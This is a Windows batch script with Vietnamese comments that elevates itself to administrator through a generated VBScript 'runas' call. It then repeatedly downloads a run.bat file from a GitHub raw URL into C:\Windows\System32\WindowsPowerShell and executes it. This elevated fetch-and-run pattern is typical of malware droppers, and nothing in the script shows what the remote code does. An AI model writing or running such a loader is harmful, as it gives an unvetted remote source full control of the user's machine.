@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

:loop
REM Kiểm tra kết nối Internet
powershell -Command "while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }"

REM Tải file run.bat từ URL
powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\run.bat https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat"
pause
REM Gọi file run.bat nếu tải thành công
if exist "C:\Windows\System32\WindowsPowerShell\run.bat" (
    call "C:\Windows\System32\WindowsPowerShell\run.bat"
pause
) else (
    echo Không thể tải file run.bat. Đang thử lại sau 30 giây...
)

REM Đợi 30 giây trước khi thử lại
timeout /t 30 /nobreak >nul
pause
REM Quay lại vòng lặp
goto loop

exit
